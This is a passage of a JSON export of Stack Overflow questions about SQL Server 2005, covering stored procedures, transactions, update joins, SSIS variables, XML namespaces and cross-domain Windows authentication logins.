dt2 = Convert.ToDateTime(txt_todate.Text);\nif (dt1 &gt; dt2)\n{\n    con.Open();\n    com = new SqlCommand(\"BTNN_MovieDB_Festival_Details_Insert\", con);\n    com.Parameters.Add(\"@fromdate\", SqlDbType.VarChar).Value = dateformat_mmdd(txt_fromdate.Text.ToString().Trim());\n    com.Parameters.Add(\"@todate\", SqlDbType.VarChar).Value = dateformat_mmdd(txt_todate.Text.ToString().Trim());\n    com.Parameters.Add(\"@return\", SqlDbType.VarChar).Direction = ParameterDirection.ReturnValue;\n    com.ExecuteNonQuery();\n    con.Close();\n    showdata();\n}\nelse if (dt1 &lt; dt2)\n{\n    lblerror.Text = \"ToDate should be greater than FromDate\";\n\n}\n</code></pre>\n"},{"tags":["sql-server-2005","clr","sqlclr"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12574912,"title":"Install a SQL CLR user defined function","body":"<p>I'm testing out some SQL CLR stuff in VS 2008 and SQL Server 2005, how do I install a user defined function on the database? I built it and have the DLL, but now what?</p>\n"},{"tags":["sql","sql-server-2005","transactions"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":712,"score":1,"question_id":1440522,"title":"What happens to the transaction in this SQL if it's not committed?","body":"<p>If I have the following SQL:</p>\n\n<pre><code>BEGIN TRANSACTION\nSELECT val\nFROM myTable\n</code></pre>\n\n<p>and don't follow it up with a commit, what happens with the TRANSACTION? Does it depend upon the context/scope that it was executed (e.g. in a proc, in mgt studio)?</p>\n\n<p>Is there some place to see if there are transactions open that have not been committed/rolled back in a database?</p>\n\n<p>Thanks,</p>\n\n<p>Chris</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12572100,"title":"SQL Server 2005 Update query with Lookup Table","body":"<p>I have two tables;</p>\n\n<p>Technology Look Up table</p>\n\n<pre><code>OSID  OSValue  \n\n1     UNIX             \n2     ORACLE            \n3     .NET \n4     SQL    \n5     SAP  \n\n------------------\n</code></pre>\n\n<p>Employee technology</p>\n\n<pre><code>empID   OSID\n\n34      1\n37      2\n45      2\n34      4\n45      6\n</code></pre>\n\n<p>Employee ID NO 37 is no more using ORACLE . He shifted to SAP . That is OSID should b updated from 2 to 5 in the second table .</p>\n\n<p>I have a temp table that has vales for technology and employee id </p>\n\n<p>Please help me with \n- writing a query that joins both above tables\n- Look up the ID of the SAP technology , and update the second table with that ID .</p>\n\n<pre><code>Update emp\nSet emp.OSID = (Select OSID from technologylookup where OSValue = tmptbl.technologyname)\nFROM employee_tech emp INNER JOIN #Temptbl tmptbl ON emp.emp_id = tmptbl.emp_id\n</code></pre>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","stored-procedures"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12569229,"title":"SQL Server : stored procedure IFNULL check","body":"<pre><code>Solution_id (Primary key, Int)\nCol1 (varchar)\nCol2 (varchar)\nCol3 (varchar)\nCol4 (varchar)\nCol5 (varchar)\n</code></pre>\n\n<p>I am writing a stored procedure to update this table. There are 6 input parameters for the above 6 columns.</p>\n\n<pre><code>@Attached_File1 VARCHAR(MAX),\n@Attached_File2 VARCHAR(MAX),\n@Attached_File3 VARCHAR(MAX),\n@Attached_File4 VARCHAR(MAX),\n@Attached_File5 VARCHAR(MAX),\n@Ticket_ID BIGINT\n</code></pre>\n\n<p>I want to write a SQL query which will update the table with the values specified in the input parameters. BUT I must not overwrite the attachment columns with null. I mean I need to use only those parameters which contains data.</p>\n\n<p>For example, if the table has a row</p>\n\n<pre><code>[10, \"aaa\", \"bbb\", \"efg\", null, null] \n</code></pre>\n\n<p>and the input parameters are </p>\n\n<pre><code>(10, null, null, \"mno\", \"ddd\", null) \n</code></pre>\n\n<p>then after the update the row will become </p>\n\n<pre><code>[10, \"aaa\", \"bbb\", \"mno\", \"ddd\", null]\n</code></pre>\n\n<p>How to check for null/empty strings and generate the update query accordingly to achieve this?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":159,"score":8,"question_id":12544051,"title":"Randomly assign work location and each location should not exceed the number of designated employees","body":"<p>I am trying to select unique random posting/recruitment places of employees within a list of places, all the employees are already posted at these places, i am trying to generate a new random posting place for them with \"where\" condition that \"employee new random location will not be equal to their home place and randomnly selected Employees with their designation must be less than or equal to Place wise designation numbers from Places table \"</p>\n\n<p>the Employee table is :</p>\n\n<pre><code>EmpNo   EmpName           CurrentPosting    Home        Designation   RandomPosting\n1       Mac               Alabama           Missouri      Manager       \n2       Peter             California        Montana       Manager       \n3       Prasad            Delaware          Nebraska      PO       \n4       Kumar             Indiana           Nevada        PO       \n5       Roy               Iowa              New Jersey    Clerk       \n</code></pre>\n\n<p>And so on...</p>\n\n<p>And the Places table (PlaceNames with number of employees  - designation wise) is :-</p>\n\n<pre><code>PlaceID  PlaceName      Manager     PO    Clerk\n1        Alabama           2        0     1\n2        Alaska            1        1     1\n3        Arizona           1        0     2\n4        Arkansas          2        1     1\n5        California        1        1     1\n6        Colorado          1        1     2\n7        Connecticut       0        2     0\n</code></pre>\n\n<p>and so on...</p>\n\n<p>tried with with newid() like as below and to be able to select Employees with RandomPosting place names,</p>\n\n<pre><code>WITH cteCrossJoin AS (\nSELECT e.*, p.PlaceName AS RandomPosting,\n       ROW_NUMBER() OVER(PARTITION BY e.EmpNo ORDER BY NEWID()) AS RowNum\n    FROM Employee e\n        CROSS JOIN  Place p\n    WHERE e.Home &lt;&gt; p.PlaceName\n)\nSELECT *\nFROM cteCrossJoin\nWHERE RowNum = 1;\n</code></pre>\n\n<p>additionally I need to limit the random selection based upon designation numbers(in Places table)... that is to assign each Employee a PlaceName(from Places) randomly which is not equal to CurrentPosting and Home(in Employee) and Place wise designation will not exceed as given numbers.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":2854718,"title":"Processing a resultset to look up foreign keys (and poulate a new table!)","body":"<p>I've been handed a dataset that has some fairly basic table structures with no keys at all. eg</p>\n\n<pre><code>{myRubishTable} - Area(varchar),AuthorityName(varchar),StartYear(varchar),StartMonth(varcha),EndYear(varchar),EndMonth(varchar),Amount(Money)\n</code></pre>\n\n<p>there are other tables that use the Area and AuthorityName columns as well as a general use of Month and Years so I I figured a good first step was to pull Area and Authority into their own tables. </p>\n\n<p>I now want to process the data in the original table and lookup the key value to put into my new table with foreign keys which looks like this. </p>\n\n<pre><code>(lookup Tables)\n{Area} - id (int, PK), name (varchar(50))\n{AuthorityName} - id(int, PK), name(varchar(50)\n\n(TargetTable)\n{myBetterTable} - id (int,PK), area_id(int FK-Area),authority_name_id(int FK-AuthorityName),StartYear (varchar),StartMonth(varchar),EndYear(varchar),EndMonth(varchar),Amount(money)\n</code></pre>\n\n<p>so row one in the old table read</p>\n\n<pre><code>MYAREA, MYAUTHORITY,2009,Jan,2010,Feb,10000\n</code></pre>\n\n<p>and I want to populate the new table with</p>\n\n<pre><code>1,1,1,2009,Jan,2010,Feb,10000\n</code></pre>\n\n<p>where the first '1' is the primary key and the second two '1's are the ids in the lookup tables.</p>\n\n<p>Can anyone point me to the most efficient way of achieving this using just SQL?</p>\n\n<p>Footnote:- I've achieved what I needed with some pretty simple WHERE clauses (I had left a rogue tablename in the FROM which was throwing me :o(  ) but would be interested to know if this is the most efficient.</p>\n\n<p>ie</p>\n\n<pre><code>SELECT   [area].[area_id],\n         [authority].[authority_name_id],\n         [myRubishTable].[StartYear],\n         [myRubishTable].[StartMonth],\n         [myRubishTable].[EndYear],\n         [myRubishTable].[EndMonth],\n         [myRubishTable].[Amount]\nFROM     [myRubishTable],[Area],[AuthorityName]\nWHERE   [myRubishTable].[Area]=[Area].[name]\nAND      [myRubishTable].[Authority Name]=[dim_AuthorityName].[name]\n</code></pre>\n"},{"tags":["sql-server-2005","ssis","parameter-passing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12565964,"title":"Return Integer value from SSIS execute SQL Task","body":"<p>I am using SQL Server 2005 Business Intelligence Studio and struggling with returning an integer value from a very simple execute SQL Task. \nFor a very simple test, I wrote the SQL Statement as:\n    <pre><code>Select 35 As 'TotalRecords'</code></pre></p>\n\n<p>Then, I specified ResultSet as</p>\n\n<pre><code>ResultName = TotalRecords and\nVariableName = User::TotalRecords\n</code></pre>\n\n<p>When I execute this, the statement is executed but the variable doesn't have the updated value. However, it has the default value that I specified while variable definition.</p>\n\n<p>The return of a date variable works, but integer variable isn't working. The type of <code>User::TotalRecords</code> specified is Int32 in a package scope.</p>\n\n<p>Thanks for any hints</p>\n"},{"tags":["sql-server","database","sql-server-2005","union"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2991,"score":0,"question_id":650040,"title":"Updateable view in mssql with multiple tables and computed values","body":"<p>Huge database in mssql2005 with big codebase depending on the structure of this database.</p>\n\n<p>I have about 10 similar tables they all contain either the file name or the full path to the file. The full path is always dependent on the item id so it doesn't make sense to store it in the database. Getting useful data out of these tables goes a little like this:</p>\n\n<pre><code>SELECT a.item_id\n, a.filename\nFROM (\n    SELECT id_item AS item_id\n    , path AS filename\n    FROM xMedia\n\n    UNION ALL\n\n    -- media_path has a different collation\n    SELECT item_id AS item_id\n    , (media_path COLLATE SQL_Latin1_General_CP1_CI_AS) AS filename\n    FROM yMedia\n\n    UNION ALL\n\n    -- fullPath contains more than just the filename\n    SELECT itemId AS item_id\n    , RIGHT(fullPath, CHARINDEX('/', REVERSE(fullPath))-1) AS filename\n    FROM zMedia\n\n    -- real database has over 10 of these tables\n) a\n</code></pre>\n\n<p>I'd like to create a single view of all these tables so that new code using this data-disaster doesn't need to know about all the different media tables. I'd also like use this view for insert and update statements. Obviously old code would still rely on the tables to be up to date.</p>\n\n<p>After reading the msdn page about <a href=\"http://msdn.microsoft.com/en-us/library/ms187956%28SQL.90%29.aspx\" rel=\"nofollow\">creating views in mssql2005</a> I don't think a view with SCHEMABINDING would be enough.</p>\n\n<p>How would I create such an updateable view?</p>\n\n<p>Is this the right way to go?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1944,"score":0,"question_id":8938527,"title":"sp_generate_inserts for SQL Server 2008","body":"<p>I've been using Narayana Vyas Kondreddi's excellent stored procedure <code>sp_generate_inserts</code> <a href=\"http://vyaskn.tripod.com/code/generate_inserts.txt\" rel=\"nofollow\">http://vyaskn.tripod.com/code/generate_inserts.txt</a> in a SQL Server 2005 database. </p>\n\n<p>But after moving to SQL Server 2008 I get weird results where a long whitespace is inserted after UNIQUEIDENTIFIER values:</p>\n\n<pre><code>INSERT INTO [BannerGroups]([Id], [DescriptionText], [Width], [Height]) \nVALUES('BFCD0173-9432-47D1-84DF-8AB3FB40BF76                                                                                                                                                                                                                           ', 'Example', 145, NULL)\n</code></pre>\n\n<p>Anyone know how to fix this?</p>\n"},{"tags":["c#",".net","sql-server-2005","transactions"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":67,"score":4,"question_id":7685577,"title":"Rolling back previously committed transaction","body":"<p>In the service I am currently developing I need to provide a twofold operation:</p>\n\n<ol>\n<li>The request being made should be registered in the database (using <code>Register()</code> method); and</li>\n<li>The request should be sent to an external <em>webservice</em> for further processing (using <code>Dispatch()</code> method).</li>\n</ol>\n\n<p>Considering that I can't switch the order of the operations, I would like to be able to \"rollback\" the first one if something goes wrong with the second, so that a then-invalid record does not get inserted to the BD. The problem here is that, of course, I am commiting the transaction inside the <code>Register</code> method. Is there any way I can roll it back from inside the <code>Dispatch</code> method if anything goes wrong?</p>\n\n<p>Edit: All transaction are being managed from the .NET-side.</p>\n"},{"tags":["sql-server-2005","batch","osql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12561074,"title":"How to get error name in batch when I use OSQL command?","body":"<p>I created a batch file which execute a sql command.</p>\n\n<p>Let's see the piece of code</p>\n\n<pre><code>SET OSQL=\"C:\\Program Files (x86)\\Microsoft SQL Server\\90\\Tools\\Binn\\osql.exe\"\nIF NOT EXIST %OSQL% ECHO OSQL.EXE not found, please check the OSQL variable!\nIF NOT EXIST %OSQL% GOTO :ERROR\n\nSET SQLQUERY_UPDATEDB = \"SELECT * FROM %DB%\";\n\n%OSQL% -S %SQLSERVERNAME% -d %DBNAME% -U %DBACCOUNT% -P %DBPASSWORD% -Q %SQLQUERY_UPDATEDB% -n -b -m-1 &gt; D:\\sqloutput.txt\n\n:ERROR\nECHO Sorry, could not complete your request!\nECHO %ERRORLEVEL%\nGOTO :END\n\n:END\nECHO Finish batch\n</code></pre>\n\n<p>The above part of code returns always 0 and <code>Sorry, could not complete your request!</code> . What does mean ?</p>\n\n<p>How to set up to display error in console to see exactly what does wrong ?</p>\n\n<p>I put <code>-m-1</code> and I removed <code>-h-1</code> accordingly with <a href=\"http://msdn.microsoft.com/en-us/library/ms162806.aspx\" rel=\"nofollow\">MSDN</a> but doesn't show up in my console.</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":8,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":19659,"score":3,"question_id":495700,"title":"Can we write a sub function or procedure inside another stored procedure - SQL Server","body":"<p>I want to check if SQL Server(2000/05/08) has the ability to write a nested stored procedure, what I meant is - WRITING a Sub Function/procedure inside another stored procedure. NOT calling another SP. </p>\n\n<p>Why I was thinking about it is- One of my SP is having a repeated lines of code and that is specific to only this SP.So if we have this nested SP feature then I can declare another sub/local procedure inside my main SP and put all the repeating lines in that. and I can call that local sp in my main SP. I remember such feature is available in Oracle SPs.</p>\n\n<p>If SQL server is also having this feature, can someone please explain some more details about it or provide a link where I can find documentation.</p>\n\n<p>Thanks in advance\nSai</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":10,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":349,"score":2,"question_id":1773333,"title":"Interesting SQL issue","body":"<p>I have a SQL problem I am trying to digest. I am using SQL Server 2005.</p>\n\n<p>In a table I have data as such:</p>\n\n<pre><code>ID     Type\n1        A\n2        A\n3        A\n3        B\n4        B\n</code></pre>\n\n<p>I need to find all of the IDs that have a Type of both A and B.</p>\n"},{"tags":["sql","sql-server-2005","query"],"answer_count":10,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":19500,"score":8,"question_id":591853,"title":"Search for a string in an all the tables, rows and columns of a DB","body":"<p>I am lost in a big database and I am not able to find where the data I get comes from. I was wondering if it is possible with SQL Server 2005 to search for a string in an all the tables, rows and columns of a DB?</p>\n\n<p>Does anybody has an idea if it is possible and how?</p>\n\n<p>Thanks!</p>\n"},{"tags":["delphi","sql-server-2005","stored-procedures","dataset"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":462,"score":1,"question_id":3227880,"title":"Everytime I try to communicate with my database with stored procedures I get this \"Cannot perform this operation on a closed dataset\"","body":"<p>I'm working on a Delphi project with a MS SQL Server database, I connected the database with ADOConnection, DataSource and ADOProc components from Borland Delphi 7 and I added this code in behind:</p>\n\n<pre><code>procedure TForm1.Button2Click(Sender: TObject);\nbegin\n  ADOStoredProc1.ProcedureName := 'sp_Delete_Clen';\n  ADOStoredProc1.Refresh;\n  ADOStoredProc1.Parameters.ParamByName('@clenID').Value := Edit6.Text;\n  ADOStoredProc1.Active := True;\n  ADOStoredProc1.ExecProc;\nend;\n</code></pre>\n\n<p>The component Edit6 is an editbox that takes the ID of the tuple that should be deleted from the database and ADOStoredProc1 is the stored procedure in the database that takes 1 parametar (the ID you want to delete).\nThe project runs with no problems, I even got a TADOTable and a DBGrid that load the information from the database, but when I try to delete a tuple from the database using its ID written in the EditBox I get this Error: \"Cannot perform this operation on a closed dataset\" and the breakpoint of the project is when the application tries to add the value for the 'clenID' parameter.\nWhere is my mistake and how to fix it?</p>\n"},{"tags":["sql","database","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":44,"score":3,"question_id":12552768,"title":"How can I select a value from a table twice with different values","body":"<p>I have Message table in which \"senderid\" and \"receiverid\"exists. \nI have User table in which username of each user is found. </p>\n\n<p>Now I want to make a stored procedure in which I select the username where userid=senderid and username in which userid=receivername. </p>\n\n<p>I tried this but it's wrong, coz I never made something like this before. </p>\n\n<pre><code>SELECT       SystemUser.SU_Username Where SystemUser.SU_ID=MessageReciever As RecieverName, SystemUser.SU_Username where Message.SenderID = SystemUser.SU_ID As SenderName FROM            Message CROSS JOIN\n                     SystemUser\n</code></pre>\n\n<p>Is there a method to do what I want?</p>\n"},{"tags":["sql","sql-server-2005","aggregate-functions"],"answer_count":5,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":6025,"score":9,"question_id":6841605,"title":"SQL Server: Get Top 1 of Each Group","body":"<p>I have a table which I want to get the latest entry for each group. Here's the table:</p>\n\n<p><code>DocumentStatusLogs</code> Table</p>\n\n<pre><code>|ID| DocumentID | Status | DateCreated |\n| 2| 1          | S1     | 7/29/2011   |\n| 3| 1          | S2     | 7/30/2011   |\n| 6| 1          | S1     | 8/02/2011   |\n| 1| 2          | S1     | 7/28/2011   |\n| 4| 2          | S2     | 7/30/2011   |\n| 5| 2          | S3     | 8/01/2011   |\n| 6| 3          | S1     | 8/02/2011   |\n</code></pre>\n\n<p>The table will be grouped by DocumentID and sorted by DateCreated in descending order. For each DocumentID, I want to get the latest status. </p>\n\n<p>My preferred output:</p>\n\n<pre><code>| DocumentID | Status | DateCreated |\n| 1          | S1     | 8/02/2011   |\n| 2          | S3     | 8/01/2011   |\n| 3          | S1     | 8/02/2011   |\n</code></pre>\n\n<ul>\n<li><p>Is there any aggregate function to get only the top from each group? See pseudo-code <code>GetOnlyTheTop</code> below:</p>\n\n<p><code>select DocumentID, GetOnlyTheTop(Status), GetOnlyTheTop(DateCreated)\nfrom DocumentStatusLogs\ngroup by DocumentID\norder by DateCreated desc</code></p></li>\n<li><p>If such function doesn't exist, is there any way I can achieve the output I want?</p></li>\n<li>Or at the first place, could this be caused by unnormalized database? I'm thinking, since what I'm looking for is just one row, should that <code>status</code> also be located in the parent table?</li>\n</ul>\n\n<p>Please see the parent table for more information:</p>\n\n<p>Current <code>Documents</code> Table</p>\n\n<pre><code>| DocumentID | Title  | Content  | DateCreated |\n| 1          | TitleA | ...      | ...         |\n| 2          | TitleB | ...      | ...         |\n| 3          | TitleC | ...      | ...         |\n</code></pre>\n\n<p>Should the parent table be like this so that I can easily access it's status?</p>\n\n<pre><code>| DocumentID | Title  | Content  | DateCreated | CurrentStatus |\n| 1          | TitleA | ...      | ...         | s1            |\n| 2          | TitleB | ...      | ...         | s3            |\n| 3          | TitleC | ...      | ...         | s1            |\n</code></pre>\n\n<p>Thanks in advance!</p>\n\n<p><strong>UPDATE</strong>\nI just learned how to use \"apply\" which makes it easier to address such problems.</p>\n"},{"tags":["sql-server-2005","spring-security","md5","password-encryption"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12508947,"title":"Hashbytes SQL Server 2005 and authentication of Spring Security","body":"<p>I've a webapp with JSF-Spring-Mybatis and Spring Security 3.1 that connects to SQL server's database. </p>\n\n<p>I've problems with Spring Security's authentication. The field \"password\" of my table users has your data encrypted with the SQL Server's function HasyBytes.</p>\n\n<p>In other words...When inserting data did the following:</p>\n\n<pre><code>insert into users(password) values (Hasybytes('MD5', 'any text')) \n</code></pre>\n\n<p>Using MD5 thought that I could use this class Md5PasswordEncoder (as mentioned here  <a href=\"http://www.packtpub.com/article/spring-security-configuring-secure-passwords\" rel=\"nofollow\">http://www.packtpub.com/article/spring-security-configuring-secure-passwords</a>) so that my users can to authenticate. But, this does not happen...I get the following message: </p>\n\n<pre><code>Authentication failed: password does not match stored value \n</code></pre>\n\n<p>In which I can be failing?</p>\n"},{"tags":["sql","sql-server-2005","synchronization","merge","recursive-query"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":317,"score":0,"question_id":4951844,"title":"Need to synchronize a table with a query (view) in the same Sql Server Database","body":"<p>I need to keep a table in sync with a recursive CTE query that joins to multiple tables.  The CTE may return different results every time it's ran (if any changes were made to the tables it joins on).  The CTE is slow and I can't afford to have a trigger run it since the query that caused the trigger to fire won't return until after the trigger has fired (I don't want a simple update to a single record to take 15 seconds because it's waiting on the trigger to finish).  Any details on how to implement the solution in SSMS would be nice too, but not necessary.</p>\n\n<p>One solution would be to have a scheduled job run the CTE, and merge it's results with the table.  The scheduled job can run every few seconds so the table  is as up-to-date as possible.  But I don't know how to create a scheduled job in Sql Server 2005 or how to Merge the results of a CTE query with a table.</p>\n\n<p>To restate my question:</p>\n\n<p><em>How do I keep the table up to date as close to real-time as possible using the CTE?</em></p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12543526,"title":"Select Single column value in multiple column?","body":"<p>I have some data in my table as follows:</p>\n\n<pre><code> ID     Name\n  2    219SUN_BV_Secure_Gateway.pdf\n  3    197FDD_BV_Secure_Gateway.pdf\n  5    225RQB_BV_Secure_Gateway.pdf\n  6    A_00025_Q1_2012.pdf         \n  7    A_00025_Q2_2012.pdf         \n  8    A_00025_Q3_2011.pdf         \n  9    C_00025_Q3_2011_PostLLC.pdf\n 10    B_00025_Q3_2011.pdf        \n</code></pre>\n\n<p>I want to fetch the data as per the following requirement:</p>\n\n<ul>\n<li>in first column, I want data whose name starts with A</li>\n<li>in Second column, I want data whose name starts with B</li>\n<li>in Third column, I want data whose name starts with C</li>\n</ul>\n\n<p>I used this query:</p>\n\n<pre><code>SELECT \n    CASE \n        WHEN DocumentFile LIKE 'A%' THEN DocumentFile \n    END as DocFile_A,\n    CASE\n        WHEN DocumentFile LIKE 'B%' THEN DocumentFile \n    END as DocFile_B,\n    CASE \n        WHEN DocumentFile LIKE 'C%' THEN DocumentFile \n    END as DocFile_C \nFROM \n    RFP_DocumentVault \n</code></pre>\n\n<p>This returns me the following results:</p>\n\n<pre><code>DocFile_A              DocFile_B          DocFile_C\n NULL          NULL             NULL\n NULL          NULL             NULL\n NULL          NULL             NULL\n A_00025_Q1_2012.pdf   NULL             NULL\n A_00025_Q2_2012.pdf   NULL             NULL\n A_00025_Q3_2011.pdf   NULL             NULL\n NULL          NULL           C_00025_Q3_2011_Post Partners II, LLC.pdf\n NULL          B_00025_Q3_2011.pdf        NULL\n</code></pre>\n\n<p>But I want results as follows:</p>\n\n<pre><code> DocFile_A            DocFile_B                 DocFile_C\n A_00025_Q1_2012.pdf  B_00025_Q3_2011.pdf     C_00025_Q3_2011_Post Partners II, LLC.pdf\n A_00025_Q2_2012.pdf  NULL                      NULL\n A_00025_Q3_2011.pdf  NULL                      NULL\n</code></pre>\n\n<p>Any idea how I can do this?</p>\n"},{"tags":["sql-server","asp.net-mvc","asp.net-mvc-3","sql-server-2005","appharbor"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12543256,"title":"How to connect to SQL Server provided by AppHarbour","body":"<p>I am new to AppHarbour and I am trying to deploy an ASP.NET MVC 3 Web application here. I have successfully deployed the web application. </p>\n\n<p>Now I want to run some sql scripts on the database provided.</p>\n\n<p>For which I have followed the following steps...</p>\n\n<p><strong>Step 1 :</strong>\n<img src=\"http://i.stack.imgur.com/WDs5G.png\" alt=\"enter image description here\">\n<strong>Step 2 :</strong>\n<img src=\"http://i.stack.imgur.com/S2LoA.png\" alt=\"enter image description here\">\n<strong>Step 3 :</strong>\n<img src=\"http://i.stack.imgur.com/aSG27.png\" alt=\"enter image description here\"></p>\n\n<p>Now here I get the server name, username and password as well as the database name, but !</p>\n\n<p>When I try connecting to this database using <code>SQL Server Management Studio</code> I just cannot connect to it.</p>\n\n<p>I always get the following error message</p>\n\n<blockquote>\n  <blockquote>\n    <p>TITLE: Connect to Server\n    Cannot connect to e2f7c78d*<strong><em>*</em></strong>*b9.sqlserver.sequelizer.com.</p>\n    \n    <p>ADDITIONAL INFORMATION:\n    This version of Microsoft SQL Server Management Studio can only be used to connect to SQL Server 2000 and SQL Server 2005 servers. (ConnectionDlg)</p>\n  </blockquote>\n</blockquote>\n\n<p>Please can some one help me on this. Thanks</p>\n"},{"tags":["sql-server-2005","tsql","xml-namespaces"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2853,"score":3,"question_id":5467387,"title":"Ignore XML namespace in T-SQL","body":"<p>How do I remove/ignore the XML namespace in an xml file when querying the data with T-SQL?</p>\n\n<p>I’m loading an xml file into a variable, and it works just fine. But the xml has a namespace set, and unless I remove it, my queries come up empty.</p>\n\n<p>T-SQL:</p>\n\n<pre><code>DECLARE @xml xml\nSELECT @xml = BulkColumn FROM OPENROWSET(BULK 'C:\\myfile.xml', SINGLE_BLOB) AS A\n\nSELECT X.z.value('ID[1]', 'VARCHAR(3)') FROM @xml.nodes('myroot/element') AS X(z)\n</code></pre>\n\n<p>XML sample:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;myroot xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n  &lt;element&gt;\n    &lt;ID&gt;1&lt;/ID&gt;\n  &lt;/element&gt;\n  &lt;element&gt;\n    &lt;ID&gt;2&lt;/ID&gt;\n  &lt;/element&gt;\n  &lt;element&gt;\n    &lt;ID&gt;3&lt;/ID&gt;\n  &lt;/element&gt;\n&lt;/myroot&gt;\n</code></pre>\n\n<p>This works, the query returns this:</p>\n\n<blockquote>\n  <p>1<br>\n  2<br>\n  3  </p>\n</blockquote>\n\n<p>But the XML also contains a default namespace:</p>\n\n<pre><code>&lt;myroot xmlns=\"http://XXX\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n</code></pre>\n\n<p>The <code>xmlns=\"http://XXX\"</code> completely screws up my query. And unfortunately manually modifying the xml before loading it is not really an option.</p>\n\n<p><strong>Questions:</strong>  </p>\n\n<ul>\n<li>How do I remove or ignore the namespace when I load the data into the variable? </li>\n<li>Or how do I modify my query to handle the namespace?</li>\n</ul>\n"},{"tags":["sql-server","sql-server-2005","cross-domain","windows-authentication"],"answer_count":1,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":4769,"score":10,"question_id":5890174,"title":"Cross Domain SQL Server Logins Using Windows Authentication","body":"<p>I have a SQL Server 2005 named instance using Windows Authentication with domain groups serving as logins. The domain structures are as follows:</p>\n\n<pre><code>      Forest1                Forest2\n      /      \\                  |\nDomain1       Domain2        Domain3\n</code></pre>\n\n<p>Objects are organized in the following domains:</p>\n\n<p><strong>Forest1.Domain1</strong></p>\n\n<ul>\n<li>Users</li>\n<li>Global Groups</li>\n</ul>\n\n<p><strong>Forest1.Domain2</strong></p>\n\n<ul>\n<li>SQL Server Instance</li>\n<li>Domain Local Groups (serving as Logins)</li>\n</ul>\n\n<p><strong>Forest2.Domain3</strong></p>\n\n<ul>\n<li>Users</li>\n<li>Global Groups</li>\n</ul>\n\n<p>All my users exist in <code>Domain1</code> and <code>Domain3</code> but the SQL Server box exists in <code>Domain2</code>. As such, my logins are  domain groups in <code>Domain2</code>. When a user in <code>Domain1</code> is added to a domain local group in <code>Domain2</code> and attempts to connect using TCP/IP protocol to the SQL Server instance, he receives the following error message:</p>\n\n<blockquote>\n  <p>Cannot connect to &lt;instance&gt;. Login failed for user 'Domain1\\userName'. (Microsoft SQL Server, Error: 18456)</p>\n</blockquote>\n\n<p>Other things I've tried:</p>\n\n<ul>\n<li><p>If I add the user as a login\nexplicitly, he can connect.</p></li>\n<li><p>If I add a <code>Domain1</code> global group of\nwhich the user is a member as a login\nexplicitly, he can connect.</p></li>\n<li><p>If I add a <code>Domain1</code> global group of\nwhich the user is a member as a\nmember of the <code>Domain2</code> domain local\ngroup used as a login, he cannot\nconnect.</p></li>\n<li><p><strong>EDIT:</strong> If I add the <code>Domain2</code> domain local group to the Demote Desktop Users group on the <code>Domain2</code> server hosting the SQL Server instance, the <code>Domain1</code> user can successfully connect to the server - I can also connect to the instance locally as the <code>Domain1</code> user (just not remotely).</p></li>\n<li><p><strong>EDIT:</strong> If I add the <code>Domain2</code> domain local group to a local server group and create a SQL Server login for that local server group, the <code>Domain1</code> user still cannot connect to the instance remotely.</p></li>\n<li><p><strong>EDIT:</strong> If I change the connection network protocol to \"Named Pipes\", the <code>Domain1</code> user can successfully connect remotely.</p></li>\n</ul>\n\n<hr>\n\n<p>From what I understand (referencing these TechNet articles: <a href=\"http://technet.microsoft.com/en-us/library/cc755692%28WS.10%29.aspx\" rel=\"nofollow\">Group Scope</a> and <a href=\"http://technet.microsoft.com/en-us/library/cc776499%28WS.10%29.aspx\" rel=\"nofollow\">Nesting Groups</a>), the domain group MUST be a domain local group in order to include users from both <code>Domain1</code> and <code>Domain3</code>.</p>\n\n<p>How can I use a domain group as a SQL Server login using Windows authentication such that the domain group can contain users from both <code>Domain1</code> and <code>Domain3</code> and users can 